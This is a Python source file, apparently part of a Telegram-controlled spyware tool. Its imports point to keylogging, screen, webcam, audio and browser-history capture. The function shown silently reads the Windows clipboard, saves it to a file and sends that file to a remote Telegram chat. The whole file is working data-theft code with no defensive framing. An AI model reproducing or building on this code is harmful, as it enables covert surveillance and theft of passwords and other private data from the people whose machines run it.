
import json
import logging
import os
import re
import shutil
import smtplib
import socket
import sys
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import Process
from pathlib import Path
from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
from threading import Thread
# External Modules #
import browserhistory as bh
import cv2
import requests
import sounddevice
from cryptography.fernet import Fernet
from PIL import ImageGrab
from pynput.keyboard import Listener

import telepot

def print_err(msg: str):
    """
    Displays the passed in error message via stderr.

    :param msg:  The error message to be displayed.
    :return:  Nothing
    """
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)

def get(botObj:telepot.Bot, chat_id, path=os.path.join(".","output","clipboard.txt")):
    """
    Gathers the clipboard contents and writes the output to the clipboard output file.

    :param export_path:  The file path where the data to be exported resides.
    :return:  Nothing
    """

    if (botObj is not None):
        botObj.sendMessage(chat_id, "Scanning...")


    # If the OS is Windows #
    if os.name == 'nt':
        import win32clipboard
    else:
        print ("only support windows")
        return

    try:
        # Access the clipboard #
        win32clipboard.OpenClipboard()
        # Copy the clipboard data #
        pasted_data = win32clipboard.GetClipboardData()

    # If error occurs acquiring clipboard data #
    except (OSError, TypeError):
        pasted_data = ''

    finally:
        # Close the clipboard #
        win32clipboard.CloseClipboard()

    try:
        # Write the clipboard contents to output file #
        with Path(path).open('w', encoding='utf-8') as clipboard_info:
            clipboard_info.write(f'Clipboard Data:\n{"*" * 16}\n{pasted_data}')

    # If error occurs during file operation #
    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)

    if (botObj is not None):
        with Path(path).open('r', encoding='utf-8') as network_io:
            botObj.sendDocument(chat_id, document=network_io, caption="clipboard")
